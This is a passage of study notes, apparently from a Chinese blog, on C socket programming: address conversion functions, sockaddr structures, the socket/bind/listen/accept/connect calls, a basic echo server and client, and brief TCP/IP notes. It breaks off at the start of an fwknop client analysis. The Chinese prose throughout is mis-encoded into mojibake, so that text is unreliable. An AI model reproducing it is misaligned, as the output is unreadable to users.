class="hljs-comment">æˆåŠŸï¼šè¿”å›dst</span><br><span class="hljs-comment">å¤±è´¥ï¼šè¿”å›NULL</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>æ”¯æŒIPv4å’ŒIPv6</p><p>å¯é‡å…¥å‡½æ•°</p><p>å…¶ä¸­inet_ptonå’Œinet_ntopä¸ä»…å¯ä»¥è½¬æ¢IPv4çš„in_addrï¼Œè¿˜å¯ä»¥è½¬æ¢IPv6çš„in6_addrã€‚</p><p>å› æ­¤å‡½æ•°æ¥å£æ˜¯void *addrptrã€‚</p><h2 id="sockaddrç»“æ„">sockaddrç»“æ„</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_2.png" alt="socket_2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br><span class="hljs-type">sa_family_t</span> sin_family; <span class="hljs-comment">/* Address family */</span>  åœ°å€ç»“æ„ç±»å‹<br><span class="hljs-type">in_port_t</span> sin_port; <span class="hljs-comment">/* Port number */</span>ç«¯å£å·<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span><span class="hljs-comment">/* Internet address */</span>IPåœ°å€<br><span class="hljs-comment">/* Pad to size of `struct sockaddr&#x27;. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __pad[__SOCK_SIZE__ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">short</span> <span class="hljs-type">int</span>) -<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span>) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> in_addr)];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><span class="hljs-comment">/* Internet address. */</span><br>__be32 s_addr;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç </p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nim">struct sockaddr_in <span class="hljs-keyword">addr</span>;<br><br><span class="hljs-keyword">addr</span>.sin_family = <span class="hljs-type">AF_INET</span>/<span class="hljs-type">AF_INET6</span><br><br><span class="hljs-keyword">addr</span>.sin_port = htons(<span class="hljs-number">9527</span>);<br><br><span class="hljs-type">int</span> dst;<br><br>inet_pton(<span class="hljs-type">AF_INET</span>, <span class="hljs-string">&quot;192.157.22.45&quot;</span>, (<span class="hljs-type">void</span> *)&amp;dst);<br><br><span class="hljs-keyword">addr</span>.sin_addr.s_addr = dst;<br><br>ã€*ã€‘<span class="hljs-keyword">addr</span>.sin_addr.s_addr = htonl(<span class="hljs-type">INADDR_ANY</span>);å–å‡ºç³»ç»Ÿä¸­æœ‰æ•ˆçš„ä»»æ„<span class="hljs-type">IP</span>åœ°å€ã€‚äºŒè¿›åˆ¶ç±»å‹ã€‚<br><br><span class="hljs-keyword">bind</span>(fd, (struct sockaddr *)&amp;<span class="hljs-keyword">addr</span>, size);<br></code></pre></td></tr></table></figure><h2 id="ç½‘ç»œå¥—æ¥å­—å‡½æ•°">ç½‘ç»œå¥—æ¥å­—å‡½æ•°</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB%5CSocket_3.png" alt="Socket_3"></p><h3 id="socketå‡½æ•°">socketå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">domain:<br>AF_INET è¿™æ˜¯å¤§å¤šæ•°ç”¨æ¥äº§ç”Ÿ<span class="hljs-built_in">socket</span>çš„åè®®ï¼Œä½¿ç”¨TCPæˆ–UDPæ¥ä¼ è¾“ï¼Œç”¨IPv4çš„åœ°å€<br>AF_INET6 ä¸ä¸Šé¢ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯æ¥ç”¨IPv6çš„åœ°å€<br>AF_UNIX æœ¬åœ°åè®®ï¼Œä½¿ç”¨åœ¨Unixå’ŒLinuxç³»ç»Ÿä¸Šï¼Œä¸€èˆ¬éƒ½æ˜¯å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨åŒä¸€å°åŠå…¶ä¸Šçš„æ—¶å€™ä½¿ç”¨<br>type:<br>SOCK_STREAM è¿™ä¸ªåè®®æ˜¯æŒ‰ç…§é¡ºåºçš„ã€å¯é çš„ã€æ•°æ®å®Œæ•´çš„åŸºäºå­—èŠ‚æµçš„è¿æ¥ã€‚è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨æœ€å¤šçš„<span class="hljs-built_in">socket</span>ç±»å‹ï¼Œè¿™ä¸ª<span class="hljs-built_in">socket</span>æ˜¯ä½¿ç”¨TCPæ¥è¿›è¡Œä¼ è¾“ã€‚<br>SOCK_DGRAM è¿™ä¸ªåè®®æ˜¯æ— è¿æ¥çš„ã€å›ºå®šé•¿åº¦çš„ä¼ è¾“è°ƒç”¨ã€‚è¯¥åè®®æ˜¯ä¸å¯é çš„ï¼Œä½¿ç”¨UDPæ¥è¿›è¡Œå®ƒçš„è¿æ¥ã€‚<br>SOCK_SEQPACKETè¯¥åè®®æ˜¯åŒçº¿è·¯çš„ã€å¯é çš„è¿æ¥ï¼Œå‘é€å›ºå®šé•¿åº¦çš„æ•°æ®åŒ…è¿›è¡Œä¼ è¾“ã€‚å¿…é¡»æŠŠè¿™ä¸ªåŒ…å®Œæ•´çš„æ¥å—æ‰èƒ½è¿›è¡Œè¯»å–ã€‚<br>SOCK_RAW <span class="hljs-built_in">socket</span>ç±»å‹æä¾›å•ä¸€çš„ç½‘ç»œè®¿é—®ï¼Œè¿™ä¸ª<span class="hljs-built_in">socket</span>ç±»å‹ä½¿ç”¨ICMPå…¬å…±åè®®ã€‚ï¼ˆpingã€tracerouteä½¿ç”¨è¯¥åè®®ï¼‰<br>SOCK_RDM è¿™ä¸ªç±»å‹æ˜¯å¾ˆå°‘ä½¿ç”¨çš„ï¼Œåœ¨å¤§éƒ¨åˆ†çš„æ“ä½œç³»ç»Ÿä¸Šæ²¡æœ‰å®ç°ï¼Œå®ƒæ˜¯æä¾›ç»™æ•°æ®é“¾è·¯å±‚ä½¿ç”¨ï¼Œä¸ä¿è¯æ•°æ®åŒ…çš„é¡ºåº<br>protocol:<br>ä¼ <span class="hljs-number">0</span> è¡¨ç¤ºä½¿ç”¨é»˜è®¤åè®®ã€‚<br>è¿”å›å€¼ï¼š<br>æˆåŠŸï¼šè¿”å›æŒ‡å‘æ–°åˆ›å»ºçš„<span class="hljs-built_in">socket</span>çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥ï¼šè¿”å›<span class="hljs-number">-1</span>ï¼Œè®¾ç½®errno<br></code></pre></td></tr></table></figure><p>socket()æ‰“å¼€ä¸€ä¸ªç½‘ç»œé€šè®¯ç«¯å£ï¼Œå¦‚æœæˆåŠŸçš„è¯ï¼Œå°±åƒopen()ä¸€æ ·è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åƒè¯»å†™æ–‡ä»¶ä¸€æ ·ç”¨read/writeåœ¨ç½‘ç»œä¸Šæ”¶å‘æ•°æ®ï¼Œå¦‚æœsocket()è°ƒç”¨å‡ºé”™åˆ™è¿”å›-1ã€‚å¯¹äºIPv4ï¼Œdomainå‚æ•°æŒ‡å®šä¸ºAF_INETã€‚å¯¹äºTCPåè®®ï¼Œtypeå‚æ•°æŒ‡å®šä¸ºSOCK_STREAMï¼Œè¡¨ç¤ºé¢å‘æµçš„ä¼ è¾“åè®®ã€‚å¦‚æœæ˜¯UDPåè®®ï¼Œåˆ™typeå‚æ•°æŒ‡å®šä¸ºSOCK_DGRAMï¼Œè¡¨ç¤ºé¢å‘æ•°æ®æŠ¥çš„ä¼ è¾“åè®®ã€‚protocolå‚æ•°çš„ä»‹ç»ä»ç•¥ï¼ŒæŒ‡å®šä¸º0å³å¯ã€‚</p><h3 id="bindå‡½æ•°">bindå‡½æ•°</h3><p>æœåŠ¡å™¨ç¨‹åºæ‰€ç›‘å¬çš„ç½‘ç»œåœ°å€å’Œç«¯å£å·é€šå¸¸æ˜¯å›ºå®šä¸å˜çš„ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¾—çŸ¥æœåŠ¡å™¨ç¨‹åºçš„åœ°å€å’Œç«¯å£å·åå°±å¯ä»¥å‘æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œå› æ­¤æœåŠ¡å™¨éœ€è¦è°ƒç”¨bindç»‘å®šä¸€ä¸ªå›ºå®šçš„ç½‘ç»œåœ°å€å’Œç«¯å£å·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sockfdï¼š<br>socketæ–‡ä»¶æè¿°ç¬¦<br><span class="hljs-keyword">addr:</span><br><span class="hljs-keyword"></span>æ„é€ å‡ºIPåœ°å€åŠ ç«¯å£å·<br>(struct sockaddr *)&amp;<span class="hljs-keyword">addr</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">addrlen:</span><br><span class="hljs-keyword"></span>sizeof(<span class="hljs-keyword">addr)é•¿åº¦</span><br><span class="hljs-keyword"></span>è¿”å›å€¼ï¼š<br>æˆåŠŸè¿”å›<span class="hljs-number">0</span>ï¼Œå¤±è´¥è¿”å›-<span class="hljs-number">1</span>, è®¾ç½®errno<br></code></pre></td></tr></table></figure><h2 id="listenå‡½æ•°">listenå‡½æ•°</h2><p>listenå‡½æ•°ç”¨æ¥è®¾ç½®å’ŒæœåŠ¡å™¨è¿æ¥çš„ä¸»æœºä¸Šé™ï¼Œå¹¶ä¸æ˜¯ç›‘å¬ï¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span></span>;<br>sockfd:<br>socketæ–‡ä»¶æè¿°ç¬¦<br>backlog:<br>è¿æ¥ä¸Šé™ï¼Œæœ€å¤§å€¼<span class="hljs-number">128</span><br>è¿”å›å€¼ï¼š<br>æˆåŠŸï¼šè¿”å›<span class="hljs-number">0</span><br>å¤±è´¥ï¼šè¿”å›<span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="acceptå‡½æ•°">acceptå‡½æ•°</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> *addrlen)</span></span>;<br>sockdf:<br>socketæ–‡ä»¶æè¿°ç¬¦<br>addr:<br>ä¼ å‡ºå‚æ•°ï¼Œè¿”å›é“¾æ¥å®¢æˆ·ç«¯åœ°å€ä¿¡æ¯ï¼Œå«IPåœ°å€å’Œç«¯å£å·<br>addrlen:<br>ä¼ å…¥ä¼ å‡ºå‚æ•°ï¼ˆå€¼-ç»“æœï¼‰,ä¼ å…¥<span class="hljs-built_in">sizeof</span>(addr)å¤§å°ï¼Œå‡½æ•°è¿”å›æ—¶è¿”å›çœŸæ­£æ¥æ”¶åˆ°åœ°å€ç»“æ„ä½“çš„å¤§å°<br>è¿”å›å€¼ï¼š<br>æˆåŠŸè¿”å›ä¸€ä¸ªæ–°çš„socketæ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºå’Œå®¢æˆ·ç«¯é€šä¿¡ï¼Œå¤±è´¥è¿”å›<span class="hljs-number">-1</span>ï¼Œè®¾ç½®errno<br></code></pre></td></tr></table></figure><p>acceptå‡½æ•°ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>cliaddr_len = <span class="hljs-keyword">sizeof</span>(cliaddr);<br>connfd = accept(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;cliaddr_len);<br>n = read(connfd, buf, MAXLINE);<br>......<br>close(connfd);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="connectå‡½æ•°">connectå‡½æ•°</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> <span class="hljs-comment">/* See NOTES */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span></span>;<br>sockdf:<br>socketæ–‡ä»¶æè¿°ç¬¦<br>addr:<br>ä¼ å…¥å‚æ•°ï¼ŒæŒ‡å®šæœåŠ¡å™¨ç«¯åœ°å€ä¿¡æ¯ï¼Œå«IPåœ°å€å’Œç«¯å£å·<br>addrlen:<br>ä¼ å…¥å‚æ•°,ä¼ å…¥<span class="hljs-built_in">sizeof</span>(addr)å¤§å°<br>è¿”å›å€¼ï¼š<br>æˆåŠŸè¿”å›<span class="hljs-number">0</span>ï¼Œå¤±è´¥è¿”å›<span class="hljs-number">-1</span>ï¼Œè®¾ç½®errno<br></code></pre></td></tr></table></figure><h2 id="server">server</h2><p>ä¸‹é¢é€šè¿‡æœ€ç®€å•çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨ç¨‹åºçš„å®ä¾‹æ¥å­¦ä¹ socket APIã€‚</p><p>server.cçš„ä½œç”¨æ˜¯ä»å®¢æˆ·ç«¯è¯»å­—ç¬¦ï¼Œç„¶åå°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å¹¶å›é€ç»™å®¢æˆ·ç«¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERV_PORT 6666</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>, <span class="hljs-title">cliaddr</span>;</span><br><span class="hljs-type">socklen_t</span> cliaddr_len;<br><span class="hljs-type">int</span> listenfd, connfd;<br><span class="hljs-type">char</span> buf[MAXLINE];<br><span class="hljs-type">char</span> str[INET_ADDRSTRLEN];<br><span class="hljs-type">int</span> i, n;<br><br>listenfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>bzero(&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>servaddr.sin_family = AF_INET;<br>servaddr.sin_addr.s_addr = htonl(INADDR_ANY);<br>servaddr.sin_port = htons(SERV_PORT);<br><br>bind(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>listen(listenfd, <span class="hljs-number">20</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepting connections ...\n&quot;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>cliaddr_len = <span class="hljs-keyword">sizeof</span>(cliaddr);<br>connfd = accept(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;cliaddr_len);<br>n = read(connfd, buf, MAXLINE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;received from %s at PORT %d\n&quot;</span>,<br>inet_ntop(AF_INET, &amp;cliaddr.sin_addr, str, <span class="hljs-keyword">sizeof</span>(str)),<br>ntohs(cliaddr.sin_port));<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>write(connfd, buf, n);<br>close(connfd);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="client">client</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERV_PORT 6666</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">servaddr</span>;</span><br><span class="hljs-type">char</span> buf[MAXLINE];<br><span class="hljs-type">int</span> sockfd, n;<br><span class="hljs-type">char</span> *str;<br><br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;usage: ./client message\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>str = argv[<span class="hljs-number">1</span>];<br><br>sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>bzero(&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br>servaddr.sin_family = AF_INET;<br>inet_pton(AF_INET, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, &amp;servaddr.sin_addr);<br>servaddr.sin_port = htons(SERV_PORT);<br><br>connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;servaddr, <span class="hljs-keyword">sizeof</span>(servaddr));<br><br>write(sockfd, str, <span class="hljs-built_in">strlen</span>(str));<br><br>n = read(sockfd, buf, MAXLINE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Response from server:\n&quot;</span>);<br>write(STDOUT_FILENO, buf, n);<br>close(sockfd);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TCP-IP">TCP/IP</h1><h3 id="OSIå„ç§è®¾å¤‡å’Œä½œç”¨ä»¥åŠå¯¹åº”ç½‘ç»œåˆ†å±‚">OSIå„ç§è®¾å¤‡å’Œä½œç”¨ä»¥åŠå¯¹åº”ç½‘ç»œåˆ†å±‚</h3><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_1.png" alt="TCP/IP_1"></p><h2 id="TCP-IPä¸OSIæ¨¡å‹">TCP/IPä¸OSIæ¨¡å‹</h2><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_2.png" alt="TCP/IP_2"></p><h3 id="TCP-IPå‘é€é‚®ä»¶æ—¶çš„åˆ†å±‚å¤„ç†">TCP/IPå‘é€é‚®ä»¶æ—¶çš„åˆ†å±‚å¤„ç†</h3><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_3.png" alt="TCP/IP_3"></p><p>åŒ…ä¸­çš„ç»“æ„</p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_4.png" alt="TCP/IP_4"></p><h3 id="å…±äº«ä»‹è´¨å‹ç½‘ç»œ">å…±äº«ä»‹è´¨å‹ç½‘ç»œ</h3><h4 id="äº‰ç”¨æ–¹å¼">äº‰ç”¨æ–¹å¼</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_5.png" alt="TCP/IP_5"></p><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_6.png" alt="TCP/IP_6"></p><h3 id="ç–‘é—®">ç–‘é—®</h3><p>è¦æ˜¯ä¸€ç›´æœ‰ä¸€ä¸ªä¸»æœºå‘é€è¿‡ç¨‹ä¸­ä¸€ç›´ä¸å…¶ä»–è®¡ç®—æœºå†²çªï¼Œè¯¥ä¸»æœºä¸€ç›´æ— æ³•å®Œæ•´å‘é€æ•°æ®è¯¥æ€ä¹ˆåŠï¼Ÿ</p><h4 id="ä»¤ç‰Œä¼ é€’æ–¹å¼">ä»¤ç‰Œä¼ é€’æ–¹å¼</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_7.png" alt="TCP/IP_7"></p><h2 id="PPP">PPP</h2><p>ç‚¹å¯¹ç‚¹åè®®ã€‚ç‰©ç†å±‚ä¹Ÿéœ€è¦è¿æ¥</p><h4 id="æ•°æ®å¸§æ ¼å¼">æ•°æ®å¸§æ ¼å¼</h4><p><img src="%E9%9B%B6%E4%BF%A1%E4%BB%BB/TCPIP_8.png" alt="TCP/IP_8"></p><h2 id="IPåè®®">IPåè®®</h2><h3 id="IPåœ°å€">IPåœ°å€</h3><p>åˆ†ç±»ï¼šAã€Bã€Cã€Dç±»</p><h1 id="fwknopé¡¹ç›®">fwknopé¡¹ç›®</h1><h2 id="clientåˆ†æ">clientåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 